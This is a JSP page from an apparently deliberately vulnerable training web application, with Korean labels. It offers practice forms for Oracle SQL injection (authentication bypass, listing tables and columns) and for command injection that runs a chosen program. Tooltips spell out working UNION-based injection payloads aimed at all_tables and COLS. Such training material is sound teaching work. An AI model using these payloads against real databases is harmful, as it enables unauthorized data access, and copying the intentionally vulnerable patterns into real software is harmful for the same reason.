<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c"   uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>${initParam.TITLE}</title>
<link rel="stylesheet" href="/HuCloud/resources/css/menu.css" />
<link rel="stylesheet" href="/HuCloud/resources/css/common.css" />
<script type="text/javascript" src="/HuCloud/resources/js/jquery-1.11.2.min.js"></script>
<script type="text/javascript" src="/HuCloud/resources/js/menu.js"></script>
<script type="text/javascript" src="/HuCloud/resources/js/tip.js"></script>
<script type="text/javascript">
$(document).ready(function() {
	$(".commandInjection").hide();
	
	$(".sql").click(function() {
		$(".sqlInjection").show();
		$(".commandInjection").hide();
	});
	
	$(".command").click(function() {
		$(".sqlInjection").hide();
		$(".commandInjection").show();
	});
});
	
</script>
</head>
<body>
<c:import url="/common/loginTop" />
<div class="wrapper">
	<div class="vNav" style="float:left;">
		<ul>
			<li class="sql">SQL Injection</li>
			<li class="command">Command Injection</li>
		</ul>
	</div>
	<div class="w-spacer">&nbsp;</div>
	<div class="content" style="float:left;">
		<div class="sqlInjection">
			<div class="result">
				결과<br/>
				<c:if test="${not empty loginVO1}">
					${result }
				</c:if>
				<c:if test="${not empty loginVO2}">
					<c:forEach items="${memberInfo}" var="memberInfo">
						${memberInfo.id}<br/>
					</c:forEach>
				</c:if>
				<c:if test="${not empty loginVO3}">
					${result }
				</c:if>
			</div>
			<div class="spacer"></div>
			<b>1. Oracle Injection (인증 우회)</b>
			<form method="post" action="/HuCloud/attack/injection/attack1">
				<table>
					<tr>
						<td>ID : <input type="text" class="tip" data-tip="SQL Injection 가능" name="id" size="10" value="${loginVO1.id}" /></td>
						<td>Password : <input type="password" name="password" size="10" value="${loginVO1.password}" /></td>
						<td><input type="submit" value="Execute" /></td>
					</tr>
				</table>
			</form>
			<div class="spacer"></div>
			<b>2. Oracle Injection (Injection 진단)</b>
			<form method="post" action="/HuCloud/attack/injection/attack2">
				<table>
					<tr>
						<td>ID : <input 
										type="text" 
										class="tip" data-tip="SQL Injection 가능 : ' 만 작성하고 Execute 했을 때 에러 발생하면 Injection 가능<br/>테이블 목록 출력 : <b>admin' union all select table_name, '1', '2' from all_tables where table_name != 'a</b><br/>테이블 컬럼 목록 출력 : <b>ADMIN' UNION ALL SELECT COLUMN_NAME, DATA_TYPE, '1' FROM COLS WHERE TABLE_NAME = 'USERS'--</b>" name="id" size="40" value="${loginVO2}" /></td>
						<td><input type="submit" value="Execute" /></td>
					</tr>
				</table>
			</form>
			<div class="spacer"></div>
			<b>3. Oracle Injection (추출 컬럼 개수 확인)</b>
			<form method="post" action="/HuCloud/attack/injection/attack3">
				<table>
					<tr>
						<td>ID : <input type="text" class="tip" data-tip="SQL Injection 가능 : ' 만 작성하고 Execute 했을 때 에러 발생하면 Injection 가능<br/><b>admin' union all select table_name, '1', '2' from all_tables where table_name != 'a</b><br/> UNION ALL 아래의 컬럼을 에러가 안날 때까지 하나씩 늘린다." name="id" size="40" value="${loginVO2}" /></td>
						<td><input type="submit" value="Execute" /></td>
					</tr>
				</table>
			</form>
		</div>
		
		
		<div class="commandInjection">
			<div class="result">
				결과<br/>
				${result }
			</div>
			<div class="spacer"></div>
			<b>1. Command Injection</b>
			<form method="post" action="/HuCloud/attack/injection/commandAttack">
				<table>
					<tr>
						<td>
							실행할 프로그램을 선택하세요 : <select name="programs">
								<option value="calc.exe">계산기</option>
								<option value="notepad.exe">메모장</option>
							</select>
						</td>
						<td><input type="submit" value="Execute" /></td>
					</tr>
				</table>
			</form>
		</div>
	</div>
	<div class="clear"></div>
</div>
<c:import url="/common/bottom" />
</body>
</html>